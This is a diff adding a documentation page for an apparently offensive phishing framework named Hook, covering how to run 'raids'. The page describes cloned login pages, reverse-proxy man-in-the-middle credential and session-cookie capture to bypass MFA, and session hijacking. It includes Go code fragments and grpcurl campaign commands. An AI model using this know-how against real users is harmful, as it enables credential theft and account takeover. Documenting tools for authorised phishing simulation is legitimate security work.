@@ -1,0 +1,231 @@
+# Raids
+
+Raids are the core attack campaigns in Hook. A raid orchestrates the entire phishing operation, from email delivery to credential capture. Hook supports two types of raids: **Forward Proxy** (static content) and **Reverse Proxy** (MITM attacks).
+
+## Overview
+
+A raid combines:
+- **Target List** - Who to attack
+- **Lure** - Email template
+- **Portal Flow** - Landing pages or target site
+- **Mail Sender** - Email delivery configuration
+- **Corsair** - Worker to execute the attack
+
+## Raid Types
+
+### Forward Proxy Raids
+
+Forward proxy raids serve static phishing content:
+
+- Serve cloned login pages
+- Capture credentials via form submission
+- Redirect to legitimate site after capture
+- Support for multi-page flows (portal flows)
+
+```go
+type DeckHand struct {
+    ContentDirectory string    // Static files to serve
+    reverseProxy     bool      // false for forward proxy
+    Upstream         proxxy.Upstream
+}
+```
+
+### Reverse Proxy Raids (MITM)
+
+Reverse proxy raids perform man-in-the-middle attacks:
+
+- Proxy all traffic to the real target site
+- Intercept and capture credentials in transit
+- Capture session cookies for hijacking
+- Maintain authenticated sessions
+- Bypass MFA by capturing session tokens
+
+```go
+type DeckHand struct {
+    reverseProxy       bool   // true for reverse proxy
+    ReverseProxyServer *reverseProxy.ReverseProxyServer
+    PhishDomain        string // e.g., login.phish.com
+    TargetDomain       string // e.g., login.microsoft.com
+}
+```
+
+## Creating a Raid
+
+### Prerequisites
+
+Before creating a raid, you need:
+1. A **Client** and **Tag** for organization
+2. A **Target List** with targets
+3. A **Lure** (email template)
+4. A **Mail Sender** configured
+5. A **Corsair** deployed
+6. For reverse proxy: A **Target Site** configuration
+
+### Create Raid Request
+
+```bash
+grpcurl -d '{
+  "raid": {
+    "name": "Q4-Campaign",
+    "client_id": 1,
+    "tag_id": 1,
+    "target_list_id": 1,
+    "lure_id": 1,
+    "sender_id": 1,
+    "corsair_id": 1,
+    "subject": "Action Required: Verify Your Account",
+    "start_date": "2024-01-15T09:00:00Z",
+    "end_date": "2024-01-20T17:00:00Z",
+    "timezone": "America/New_York"
+  },
+  "is_reverse": false
+}' helm:61443 hook.ctrl_svc.ControlPlaneService/NewRaid
+```
+
+### Raid Initialization
+
+When a raid is created, Hook:
+
+1. **Inserts raid** into database
+2. **Sends to Corsair** over mesh network
+3. **Creates Deckhand** worker on Corsair
+4. **Fetches lure** and creates mail items
+5. **Schedules emails** based on start/end times
+
+```go
+func Initialize(raidInit *RaidInit) {
+    // Send raid configuration to Corsair
+    err := sendToCorsair(raidInit)
+    
+    // Insert raid into database
+    raidID := insertRaid(raidInit.newRaid, raidInit.dsn)
+    
+    // Get targets and create mail items
+    targets := getTargetsForRaid(raidInit.newRaid.TargetListId, raidInit.dsn)
+    mailItems := createMailItems(targets, lure, raidInit)
+    
+    // Schedule email delivery
+    createSchedule(mailItems, raidInit)
+}
+```
+
+## Reverse Proxy Session Handling
+
+### Session Tracking
+
+Each victim gets a unique session:
+
+```go
+type Session struct {
+    Id           string
+    Username     string
+    Password     string
+    CookieTokens map[string]map[string]*CapturedCookie
+    BodyTokens   map[string]string
+    HttpTokens   map[string]string
+    RemoteAddr   string
+    UserAgent    string
+    IsDone       bool
+    IsAuthUrl    bool
+}
+```
+
+### Credential Capture
+
+The reverse proxy intercepts login requests:
+
+```go
+func proxyRequest(r *http.Request) {
+    // Check if this is the login URL
+    if s.Target.Login.URI == r.URL.Path {
+        s.trackResult()
+    }
+    
+    // Extract credentials from body, URL, form data
+    bodyParams := scrapeRequestBody(bodyBytes)
+    urlEncoded := scrapeRequestURLFormEncoded(r)
+    urlParams := scrapeUrlParameters(r.URL)
+    
+    // Search for credentials
+    s.searchForCredentials(bodyParams)
+    s.searchForCredentials(urlEncoded)
+    s.searchForCredentials(urlParams)
+}
+```
+
+### Session Hijacking
+
+After authentication, sessions can be hijacked:
+
+```go
+func (h *Hijacker) HijackSession(s *Session) {
+    port := h.findOpenPort()
+    h.sessions[s.Id] = port
+    
+    // Create proxy with captured cookies/headers
+    err := NewProxy(port, "0.0.0.0", s.Target.TargetURL, s.Cookies, s.Headers)
+}
+```
+
+## Raid Lifecycle Events
+
+### Email Opens
+
+Tracked via tracking pixels:
+
+```go
+func (s *Service) sendOpen(occurred, ip, sessionId, campaign string) {
+    open := &pb.Open{
+        SessionID: sessionId,
+        Occurred:  occurred,
+        Ip:        ip,
+        Campaign:  campaign,
+    }
+    gClient.NewOpen(ctx, open)
+}
+```
+
+### Link Clicks
+
+Tracked when victims visit the phishing page:
+
+```go
+func (s *Service) sendClick(occurredAt, page, ip, sessionId, campaign string) {
+    click := &pb.Click{
+        SessionID: sessionId,
+        Occurred:  occurredAt,
+        Page:      page,
+        Ip:        ip,
+        Campaign:  campaign,
+    }
+    gClient.NewClick(ctx, click)
+}
+```
+
+## Managing Raids
+
+### List Raids
+
+```bash
+grpcurl -d '{"id": 1}' helm:61443 hook.ctrl_svc.ControlPlaneService/GetRaidsForClient
+```
+
+### Get Raid Details
+
+```bash
+grpcurl -d '{"id": 1}' helm:61443 hook.ctrl_svc.ControlPlaneService/GetRaidByID
+```
+
+### Update Raid
+
+```bash
+grpcurl -d '{"raid": {"id": 1, "name": "Updated Name"}}' \
+  helm:61443 hook.ctrl_svc.ControlPlaneService/UpdateRaid
+```
+
+## Next Steps
+
+- [Session Capture](/docs/session-capture) - Captured data details
+- [Lures & Emails](/docs/lures-emails) - Email templates
+- [Clients, Tags, Targets](/docs/clients-tags-targets) - Target management
+
